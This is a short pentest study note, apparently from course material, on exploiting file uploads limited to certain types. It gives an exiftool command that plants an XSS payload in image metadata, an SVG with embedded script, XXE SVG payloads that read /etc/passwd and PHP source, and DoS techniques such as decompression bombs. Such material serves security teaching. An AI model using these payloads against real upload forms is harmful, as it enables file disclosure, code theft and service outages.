# Limited File Uploads

While secure filters may restrict file uploads to specific types, limited uploads can still introduce vulnerabilities. Fuzzing allowed extensions helps identify exploitable attack vectors.

## XSS

Malicious file uploads can introduce Stored XSS vulnerabilities:

- **HTML files**: Can embed JavaScript for XSS/CSRF attacks if users visit uploaded pages from trusted sources
- **Image metadata**: XSS payloads in parameters like Comment or Artist get executed when metadata is displayed
    ```bash
    exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
    ```
- **SVG images**: XML-based format allows embedding XSS payloads
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
        <script type="text/javascript">alert(window.origin);</script>
    </svg>
    ```

## XXE

XXE attacks via file uploads can leak internal files and source code:

**Read system files** (SVG/XML):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**Read PHP source code** (base64 encoded):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Office documents (PDF, Word, PowerPoint) also contain exploitable XML data. XXE can enable SSRF attacks against internal services.

## DoS

Multiple DoS vectors exist through file uploads:

- **Decompression Bomb**: Nested ZIP archives expand to massive sizes, crashing the server
- **Pixel Flood**: Malicious JPG/PNG with inflated dimensions (0xffff × 0xffff) causes memory exhaustion
- **Large files**: Uploads without size limits fill server storage
- **Directory traversal**: Path traversal in uploads (e.g., `../../../etc/passwd`) can crash the server
